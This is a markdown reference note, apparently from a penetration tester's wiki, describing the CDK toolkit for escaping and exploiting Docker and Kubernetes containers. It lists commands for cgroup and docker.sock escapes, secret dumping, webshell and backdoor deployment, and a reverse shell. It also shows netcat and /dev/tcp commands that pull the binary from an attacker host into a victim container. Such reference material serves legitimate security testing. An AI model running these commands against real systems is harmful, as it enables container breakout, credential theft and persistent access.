---
type: tool
category: exploitation
tags: [container, docker, kubernetes, escape, cloud, k8s, privilege-escalation]
---

## What it is
CDK (Container DucKing) is a zero-dependency container penetration toolkit for exploiting and escaping Docker, Kubernetes, and containerd environments — no OS dependencies required, runs inside slim containers.

- GitHub: https://github.com/cdk-team/CDK
- Presented at BlackHat Asia 2021 Arsenal & HITB SecConf 2021

## Core flags / syntax

| Command                    | Meaning                                   |
| -------------------------- | ----------------------------------------- |
| `cdk evaluate`             | Gather container info and find weaknesses |
| `cdk evaluate --full`      | Same as above + file scan                 |
| `cdk run --list`           | List all available exploits               |
| `cdk run <exploit> [args]` | Run a specific exploit                    |
| `cdk <tool> [args]`        | Run a built-in network tool               |

## Three Modules

### 1. Evaluate
Gathers info inside the container to surface potential weaknesses.

```bash
# Quick evaluation
./cdk evaluate

# Full evaluation (includes file scan)
./cdk evaluate --full
```

Checks performed:
- OS info, capabilities, available Linux commands
- Mounts, net namespace, sensitive ENV vars
- Sensitive processes and local files
- K8s API-server, service-account, cloud metadata API
- CVE-2020-8558 (kube-proxy route localnet)
- DNS-based service discovery

---

### 2. Exploit
Container escaping, persistence, lateral movement, credential access.

```bash
# List all exploits
./cdk run --list

# Container escape via cgroups
./cdk run mount-cgroup

# Escape via docker.sock RCE
./cdk run docker-sock-pwn

# Read arbitrary file from host (requires CAP_DAC_READ_SEARCH)
./cdk run cap-dac-read-search

# Reverse shell
./cdk run reverse-shell <attacker-ip> <port>

# Dump K8s secrets
./cdk run k8s-secret-dump

# Deploy a webshell for persistence
./cdk run webshell-deploy <port> <path>
```

**Key exploits by category:**

| Category | Exploit Name | Notes |
|----------|-------------|-------|
| Escaping | `runc-pwn` | CVE-2019-5736 |
| Escaping | `shim-pwn` | CVE-2020-15257 containerd |
| Escaping | `mount-cgroup` | Cgroups escape |
| Escaping | `docker-sock-pwn` | docker.sock RCE |
| Escaping | `mount-disk` | Device mount escape |
| Escaping | `lxcfs-rw` | LXCFS escape |
| Escaping | `abuse-unpriv-userns` | CVE-2022-0492 |
| Escaping | `cap-dac-read-search` | Read host files |
| Credential Access | `k8s-secret-dump` | Dump K8s secrets |
| Credential Access | `etcd-get-k8s-token` | Pull tokens from etcd |
| Credential Access | `registry-brute` | Registry brute-force |
| Persistence | `k8s-backdoor-daemonset` | Backdoor pod |
| Persistence | `webshell-deploy` | Deploy webshell |
| Persistence | `k8s-shadow-apiserver` | Shadow API server |
| Priv Esc | `k8s-get-sa-token` | K8s RBAC bypass |

---

### 3. Tool
Built-in network and K8s utilities usable inside containers that have no standard tools.

```bash
# TCP tunnel (like netcat)
./cdk nc -lvp 4444

# Port scan
./cdk probe 10.0.1.0-255 80,8080-9443 50 1000

# Network info
./cdk ifconfig

# Process list
./cdk ps

# K8s API request
./cdk kcurl /api/v1/namespaces get "" ""

# Request to docker unix socket
./cdk ucurl get /var/run/docker.sock /containers/json ""

# Enumerate etcd keys (unauthenticated)
./cdk ectl <endpoint> get <key>
```

## Installation / Delivery

```bash
# Download latest release
# https://github.com/cdk-team/CDK/releases/

# If target has curl/wget — drop binary directly

# If no curl/wget — deliver via netcat:
# On attacker machine:
nc -lvp 999 < cdk

# Inside victim container:
cat < /dev/tcp/<attacker-ip>/999 > cdk
chmod a+x cdk
```

## Tips & gotchas
- Run `evaluate --full` first to get a recommended exploit for the current environment
- The **thin** release (~2MB) covers 90% of features — use for short-lived containers/serverless
- CDK is statically compiled — zero OS dependencies, works in distroless/scratch containers
- `probe` is useful when `nmap` isn't available inside the container
- Always check capabilities first — many escapes require specific caps (e.g. `CAP_SYS_ADMIN`, `CAP_DAC_READ_SEARCH`)
- For K8s lateral movement, chain `evaluate` findings with `k8s-secret-dump` and `k8s-get-sa-token`

## Related
- [[metasploit]]
- [[msfvenom]]
- [[netcat]]
- [[nmap]]
